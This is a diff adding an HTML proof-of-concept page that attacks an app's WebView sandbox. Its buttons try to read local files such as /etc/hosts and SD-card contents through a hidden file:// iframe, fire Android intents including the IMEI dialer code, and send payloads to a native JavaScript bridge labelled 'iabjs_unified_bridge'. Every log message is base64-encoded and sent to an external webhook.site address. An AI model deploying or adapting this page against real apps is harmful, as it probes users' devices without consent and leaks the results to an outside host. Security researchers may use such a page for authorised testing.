@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebView Sandbox Escape PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Courier New', monospace; background: #0d1117; color: #58a6ff; padding: 20px; }
+        .card { border: 1px solid #30363d; background: #161b22; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
+        h3 { color: #f85149; margin-top: 0; border-bottom: 1px solid #30363d; padding-bottom: 5px; }
+        button { background: #238636; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 5px; }
+        .log-box { background: #000; color: #7ee787; padding: 10px; font-size: 11px; min-height: 50px; margin-top: 10px; border-radius: 4px; word-break: break-all; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h3>1. File Access (Critical)</h3>
+        <p style="font-size:12px;">Attempt to read local system files.</p>
+        <button onclick="testFileAccess('/etc/hosts')">Read /etc/hosts</button>
+        <button onclick="testFileAccess('/sdcard/Download/test.txt')">Read SD Card</button>
+    </div>
+
+    <div class="card">
+        <h3>2. Intent Hijacking</h3>
+        <p style="font-size:12px;">Force open system apps (Settings/Dialer).</p>
+        <button onclick="triggerIntent('intent:#Intent;action=android.settings.SETTINGS;end')">Open System Settings</button>
+        <button onclick="triggerIntent('tel:*#06#')">Open Dialer (IMEI)</button>
+    </div>
+
+    <div class="card">
+        <h3>3. Universal Bridge Hijack</h3>
+        <p style="font-size:12px;">Try to trigger native hardware actions.</p>
+        <button onclick="bridgeExploit('vibrate')">Force Phone Vibrate</button>
+        <button onclick="bridgeExploit('toast')">Show Native Toast</button>
+    </div>
+
+    <div class="log-box" id="console">Log: Waiting for action...</div>
+
+    <script>
+        const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
+
+        function log(msg) {
+            document.getElementById('console').innerHTML = "> " + msg;
+            // Send log to webhook
+            fetch(webhook + "?log=" + btoa(msg));
+        }
+
+        // 1. FILE ACCESS TEST
+        function testFileAccess(path) {
+            log("Attempting to load: " + path);
+            // Iframe se try karna sabse best hai local file read ke liye
+            let ifr = document.createElement('iframe');
+            ifr.style.display = 'none';
+            ifr.src = "file://" + path;
+            document.body.appendChild(ifr);
+            
+            setTimeout(() => {
+                try {
+                    let content = ifr.contentDocument || ifr.contentWindow.document;
+                    log("SUCCESS: File read possible!");
+                } catch(e) {
+                    log("BLOCKED: Cross-origin or File access denied.");
+                }
+            }, 1000);
+        }
+
+        // 2. INTENT INJECTION
+        function triggerIntent(url) {
+            log("Triggering Intent: " + url);
+            window.location.href = url;
+        }
+
+        // 3. BRIDGE EXPLOIT
+        function bridgeExploit(action) {
+            if (window.iabjs_unified_bridge) {
+                log("Attacking Bridge...");
+                let payload = action === 'vibrate' ? 
+                    {"action":"vibrate", "duration":2000} : 
+                    {"action":"showToast", "text":"SECURITY_PWNED"};
+                
+                window.iabjs_unified_bridge.postMessage(JSON.stringify(payload));
+                log("Payload sent to bridge. Check phone reaction.");
+            } else {
+                log("ERROR: iabjs_unified_bridge not found.");
+            }
+        }
+    </script>
+</body>
+</html>
